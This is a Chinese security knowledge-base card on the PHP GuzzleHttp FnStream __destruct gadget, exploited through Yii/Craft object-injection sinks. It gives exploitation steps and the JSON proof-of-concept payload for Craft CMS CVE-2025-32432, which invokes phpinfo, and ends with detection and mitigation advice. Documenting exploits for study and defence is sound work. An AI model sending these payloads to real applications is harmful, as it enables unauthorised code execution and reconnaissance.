---
id: web-php-deserialization-guzzle-fnstream-destruct-callable-gadget
title: GuzzleHttp\Psr7\FnStream 析构 gadget：__destruct 无参调用 _fn_close，绕过 __wakeup 经 DI/对象构造注入触发
type: scenario
domain: web
path: web/php/deserialization
technique: guzzle-fnstream-destruct-callable-gadget
tags:
- php
- guzzle
- psr7
- deserialization
- object-injection
- pop-chain
- destruct
- gadget
- allow-dynamic-properties
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V242
  verified_at: '2026-11-07T13:23:47+08:00'
  notes: '已对照原文与 img/04、img/05 核对：FnStream 的 #[AllowDynamicProperties]、__construct 写入 _fn_* 动态属性、__get 抛错、__destruct 调用 _fn_close、__wakeup 抛 LogicException 均一致；修正“不可行路径”示例的序列化长度 O:25→O:24（GuzzleHttp\Psr7\FnStream 为 24 字符），其余描述准确；该卡与 Craft 全链卡为同文互补卡，dedup 判 new/related，保留。'
url: /docs/web/php/deserialization/web-php-deserialization-guzzle-fnstream-destruct-callable-gadget/
draft: false
kb_aliases:
- FnStream gadget
- _fn_close
- Guzzle POP 链
- GuzzleHttp FnStream 任意函数调用
- Craft CMS CVE-2025-32432 gadget
- AllowDynamicProperties 动态属性 gadget
---

## 一句话结论

`GuzzleHttp\Psr7\FnStream` 是一个可直接用于 PHP 对象注入的析构 gadget：类上有 `#[AllowDynamicProperties]`，攻击者只要能在实例化时写入动态属性 `_fn_close`（例如通过 Yii/Craft 的 `createObject` 配置注入类名与属性），对象析构时 `__destruct()` 就会执行 `($this->_fn_close)()`，无参调用任意 callable；而 `FnStream::__wakeup()` 会抛 `LogicException`，所以经典 `unserialize()` 反序列化路径被堵死，这条 gadget 必须走“对象构造/DI 属性注入”入口（Craft CMS CVE-2025-32432 就是该 gadget 的实战用法）。

## 原理

- **类定义关键代码**（原文对照的 `vendor/guzzlehttp/psr7/src/FnStream.php`）：
  ```php
  #[AllowDynamicProperties]
  final class FnStream implements StreamInterface
  {
      private const SLOTS = [
          '__toString', 'close', 'detach', 'rewind',
          'getSize', 'tell', 'eof', 'isSeekable', 'seek', 'isWritable', 'write',
          'isReadable', 'read', 'getContents', 'getMetadata',
      ];

      /** @var array<string, callable> */
      private $methods;

      public function __construct(array $methods)
      {
          $this->methods = $methods;

          // Create the functions on the class
          foreach ($methods as $name => $fn) {
              $this->{'_fn_' . $name} = $fn;
          }
      }

      public function __get(string $name): void
      {
          throw new \BadMethodCallException(str_replace('_fn_', '', $name)
              . '() is not implemented in the FnStream');
      }

      public function __destruct()
      {
          if (isset($this->_fn_close)) {
              ($this->_fn_close)();
          }
      }

      public function __wakeup(): void
      {
          throw new \LogicException('FnStream should never be unserialized');
      }
  }
  ```
- **析构点是完整 gadget**：`__destruct()` 检查动态属性 `_fn_close` 是否存在，存在就把它当 callable 无参调用。属性值若为字符串 `phpinfo`，析构时就执行 `phpinfo()`；若为 `["Class", "staticMethod"]` 这类两元素数组，就调用对应静态方法。攻击者不需要触发任何业务方法，只要对象被销毁即可。
- **动态属性是入口**：`#[AllowDynamicProperties]` 让 PHP 8.2+ 也允许 `FnStream` 接受未声明属性，因此 DI/对象工厂在配置阶段写入 `_fn_close` 不会报错（没有该 attribute 的类在 PHP 8.2 会触发动态属性弃用，未来版本可能直接报错）。
- **正常构造器不是唯一写入途径**：构造器只会把 `$methods` 里的键写成 `_fn_<name>` 动态属性；而通过 DI 容器的“属性配置”机制（如 Yii 的 `Yii::configure()` 把配置数组每个键赋给对象属性）可以直接写 `_fn_close`，同时用 `__construct()` 键给构造器传 `[[]]` 让 `$methods` 为空，避免构造函数里出现不可控的 callable。
- **为什么 `unserialize()` 不行**：`__wakeup()` 显式抛 `LogicException('FnStream should never be unserialized')`，任何 `unserialize('O:...')` 构造都会在还原阶段被打断，无法走到 `__destruct`。这是 Guzzle 针对反序列化攻击的防护，但也说明该 gadget 的正确触发面是“能新建对象并写属性的对象注入”，而不是字面意义上的反序列化。
- **为什么能扩大危害**：对象注入 sink 通常允许攻击者控制类名与任意属性（例如 Yii 的 `createObject` 支持 `__class` 优先覆盖 `class`、`as <name>` 挂载行为配置）。在这类 sink 里，`FnStream` 提供“任意零参 callable”这一跳；若再找到能接收参数的 gadget，就能进一步走到命令执行。

## 触发条件

- 应用依赖中存在 `guzzlehttp/psr7`（Guzzle 6/7 系广泛使用；Craft CMS 等 PHP 应用自带），且 `GuzzleHttp\Psr7\FnStream` 可被自动加载。
- 存在一个对象注入 sink：攻击者能控制“实例化哪个类”和“给对象写哪些属性”，且不经过 `unserialize()`（如 Yii/Craft 的 `createObject` 配置、其他框架的 DI 容器配置）。仅能反序列化则会被 `__wakeup()` 拦截。
- 目标 callable 必须是零参可调用：`phpinfo`、`getcwd`、`phpversion`、`gc_collect_cycles`、静态方法数组等；`system`/`exec`/`shell_exec` 需要参数，不能直接作为 `_fn_close` 完成命令执行。
- 对象必须在攻击者可控的时点被销毁（请求结束、引用计数归零、容器清空等）；典型做法是把它挂到某个请求生命周期对象上（如 Yii 组件的 behavior 表）。

## 利用步骤

1. 在目标代码中寻找对象注入 sink：入参数组被传入 `Yii::createObject()` / `Craft::createObject()` / DI 容器 `get()`，且数组键值可控。
2. 构造配置数组，让 `__class` 指向 `GuzzleHttp\Psr7\FnStream`，`__construct()` 传 `[[]]`（空 methods），并加入 `_fn_close` 作为动态属性：
   ```json
   {
     "__class": "GuzzleHttp\\Psr7\\FnStream",
     "__construct()": [[]],
     "_fn_close": "phpinfo"
   }
   ```
   若 sink 是 Yii 的 behavior 挂载（`as <name>`），可像 Craft 的 PoC 一样用 `class` 放一个合法 Behavior 类做占位，`__class` 仍会覆盖实际类。
3. 让对象被保留到请求结束（例如作为组件的 behavior 保存在 `_behaviors` 数组），请求结束时析构触发 `_fn_close()`。
4. 观察 `phpinfo()` 页面确认函数调用；随后把 `_fn_close` 替换为其他零参 callable 探测目标环境（如 `getcwd`、`phpversion`），或把 `["Class", "staticMethod"]` 作为 callable 调用静态方法。
5. 若目标环境里存在能接收参数的 gadget，可继续组合实现命令执行；单独使用本 gadget 时按“任意零参函数调用/信息泄露”评估，不要直接声称已 RCE。

## PoC

Craft CMS CVE-2025-32432 中的实际配置（摘自原文 RAW 包，`as session` 是 Yii 行为挂载，`FieldLayoutBehavior` 仅作合法类占位）：

```json
{
  "assetId": 11,
  "handle": {
    "width": 123,
    "height": 123,
    "as session": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "GuzzleHttp\\Psr7\\FnStream",
      "__construct()": [[]],
      "_fn_close": "phpinfo"
    }
  }
}
```

等价的对象构造示意（伪代码，展示各配置键的去向；不依赖具体框架可直接执行）：

```php
// DI 工厂按配置创建对象：
// 1) __class 覆盖 class，实例化 FnStream
// 2) __construct() 参数 [[]] -> new FnStream([])
// 3) 其余键作为属性写入 -> $obj->_fn_close = 'phpinfo'
$obj = $container->get('GuzzleHttp\Psr7\FnStream', [], [
    '__construct()' => [[]],
    '_fn_close' => 'phpinfo',
]);
unset($obj); // __destruct() -> phpinfo()
```

不可行路径（说明为什么必须走对象构造而不是 `unserialize`）：

```php
unserialize('O:24:"GuzzleHttp\Psr7\FnStream":1:{s:9:"_fn_close";s:7:"phpinfo";}');
// FnStream::__wakeup() 抛 LogicException('FnStream should never be unserialized')
```

## 变体与关联

- `_fn_close` 可换成别的零参函数名，或 `["ClassName", "staticMethodName"]` 形式的静态方法 callable；若对象注入 sink 能在 PHP 侧传入闭包（JSON 入口通常不行），也可直接放闭包。
- 只有 `_fn_close` 会被 `__destruct` 调用；构造器写入的其他 `_fn_<name>` 属性不会触发，除非业务代码调用对应方法名。
- 关联：`[[web-php-deserialization-craft-cms-cve-2025-32432-yii-createobject-fnstream]]`（本 gadget 的完整实战链：Craft CMS `generate-transform` → Yii `createObject` → FnStream）；`[[web-php-deserialization-destruct-system-webshell-base64]]` 与 `[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]`（其他 `__destruct` 起步的 POP 链，可对比“析构直连 sink”和“多级魔术方法串联”）。
- 注意：`__wakeup` 的异常是 Guzzle 的刻意防护，审计时不要看到 `FnStream` 就误判为可直接 `unserialize` 利用；要确认入口是构造器/DI 配置注入。

## 检测与防御

- **检测**：请求体/配置中出现 `GuzzleHttp\Psr7\FnStream`、`_fn_close`、`__class`、`__construct()` 等特征；日志中出现 `FnStream should never be unserialized`；应用进程执行了异常的零参函数（phpinfo 输出、异常静态方法调用）。
- **修复/缓解**：升级 Guzzle psr7 到当前版本（`__wakeup` 防护已存在，但 `__destruct` 行为本身仍可被对象注入利用）；根本修复是消除对象注入 sink——不要把用户可控数组直接传给 `createObject`/DI 容器，必须对类名做白名单、禁止 `__class`/`as ` 等配置键。
- **加固**：PHP 8.2+ 可考虑禁用动态属性（但本类显式声明了 `#[AllowDynamicProperties]`，不会生效）；容器只允许注册过的服务，不接受任意类名；生产环境关闭 `phpinfo` 类信息泄露输出；WAF 对包含上述特征的 JSON body 告警。
